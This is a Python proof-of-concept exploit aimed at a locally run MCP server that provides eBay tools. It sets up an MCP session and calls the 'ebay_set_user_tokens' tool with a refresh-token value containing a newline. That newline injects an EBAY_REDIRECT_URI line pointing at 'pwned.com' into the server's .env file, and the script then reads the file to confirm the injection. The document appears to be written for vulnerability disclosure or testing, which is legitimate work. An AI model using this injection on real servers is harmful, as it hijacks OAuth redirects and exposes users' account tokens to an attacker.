import requests
import json
import sys
import time

TARGET_URL = "http://localhost:3000"
MCP_ENDPOINT = f"{TARGET_URL}/"

def main():
    print("[*] Starting POC for Environment Variable Injection...")
    
    # 1. Check if target is up
    try:
        requests.get(f"{TARGET_URL}/health")
        print("[+] Target is up.")
    except:
        print("[-] Target is down. Please start the server.")
        sys.exit(1)

    # 2. Initialize Session
    print("[*] Initializing MCP session...")
    init_payload = {
        "jsonrpc": "2.0",
        "method": "initialize",
        "params": {
            "protocolVersion": "2024-11-05",
            "capabilities": {},
            "clientInfo": {
                "name": "poc-client",
                "version": "1.0.0"
            }
        },
        "id": 1
    }
    
    try:
        res = requests.post(MCP_ENDPOINT, json=init_payload, headers={"Accept": "application/json, text/event-stream"})
        res.raise_for_status()
        session_id = res.headers.get('Mcp-Session-Id')
        
        if not session_id:
            print("[-] Failed to get session ID from headers.")
            print(f"Headers: {res.headers}")
            # Try to see if it's in the body? Unlikely for this transport.
            # Maybe the SDK returns it in the response body? No, standard is header for HTTP transport usually.
            sys.exit(1)
            
        print(f"[+] Session ID: {session_id}")
        
        # 3. Send initialized notification
        requests.post(MCP_ENDPOINT, json={
            "jsonrpc": "2.0",
            "method": "notifications/initialized"
        }, headers={"Mcp-Session-Id": session_id})
        
    except Exception as e:
        print(f"[-] Initialization failed: {e}")
        if 'res' in locals():
            print(res.text)
        sys.exit(1)

    headers = {
        "Mcp-Session-Id": session_id,
        "Accept": "application/json, text/event-stream"
    }

    # Helper for tool calls
    def call_tool_with_session(tool_name, arguments):
        payload = {
            "jsonrpc": "2.0",
            "method": "tools/call",
            "params": {
                "name": tool_name,
                "arguments": arguments
            },
            "id": 2
        }
        try:
            response = requests.post(MCP_ENDPOINT, json=payload, headers=headers)
            response.raise_for_status()
            return response.json()
        except Exception as e:
            print(f"[-] Error calling tool {tool_name}: {e}")
            if 'response' in locals():
                 print(response.text)
            return None

    # 4. Get initial OAuth URL
    print("[*] Checking initial state...")
    res = call_tool_with_session("ebay_get_oauth_url", {})
    if not res or 'result' not in res:
        print("[-] Failed to get initial OAuth URL")
    else:
        content = json.loads(res['result']['content'][0]['text'])
        print(f"[*] Initial OAuth URL response: {content['url'][:100]}...")

    # 5. Perform Injection
    injection_payload = 'val"\nEBAY_REDIRECT_URI="http://pwned.com'
    
    print(f"[*] Sending injection payload...")
    res = call_tool_with_session("ebay_set_user_tokens", {
        "accessToken": "dummy_access_token",
        "refreshToken": injection_payload
    })
    
    if res and 'error' not in res:
        print("[+] Injection request successful (server accepted it).")
        print(f"Result: {json.dumps(res, indent=2)}")
    else:
        print(f"[-] Injection request failed: {res}")

    # 6. Verify Injection via File Check (since we are local)
    print("[*] Verifying injection by reading .env file locally...")
    try:
        with open('.env', 'r') as f:
            content = f.read()
            if 'EBAY_REDIRECT_URI="http://pwned.com"' in content:
                print("[!] VULNERABILITY CONFIRMED: .env file was modified with injected variable!")
                print("--- .env content snippet ---")
                for line in content.splitlines():
                    if "EBAY_REDIRECT_URI" in line or "INJECTED" in line:
                        print(line)
                print("----------------------------")
            else:
                print("[-] Injection not found in .env file.")
                print(content)
    except Exception as e:
        print(f"[-] Could not read .env file: {e}")

if __name__ == "__main__":
    main()
